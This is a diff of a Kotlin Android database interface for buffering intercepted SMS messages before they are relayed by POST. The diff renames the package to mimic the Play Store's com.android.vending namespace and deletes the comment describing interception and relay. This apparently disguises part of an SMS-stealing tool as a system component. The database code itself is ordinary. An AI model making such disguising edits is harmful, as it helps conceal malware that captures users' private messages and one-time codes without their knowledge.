@@ -1,4 +1,4 @@
-package com.yourname.relay.buffer
+package com.android.vending.preload.check.buffer
 
 import androidx.room.Dao
 import androidx.room.Delete
@@ -6,21 +6,9 @@ import androidx.room.Insert
 import androidx.room.OnConflictStrategy
 import androidx.room.Query
 import androidx.room.Update
-import kotlinx.coroutines.flow.Flow
 
-/**
- * Data access for the offline SMS buffer.
- *
- * Key operations:
- *  - insert()        : queue a new SMS (called at intercept time)
- *  - getPending()    : drain worker pulls a batch (oldest first)
- *  - update()        : bump attempt count after a failed POST
- *  - delete()        : remove on successful relay
- *  - countPending()  : used to cap queue size (MAX_BUFFERED_MESSAGES)
- */
 @Dao
 interface BufferedSmsDao {
-
     @Insert(onConflict = OnConflictStrategy.ABORT)
     suspend fun insert(sms: BufferedSms): Long
 
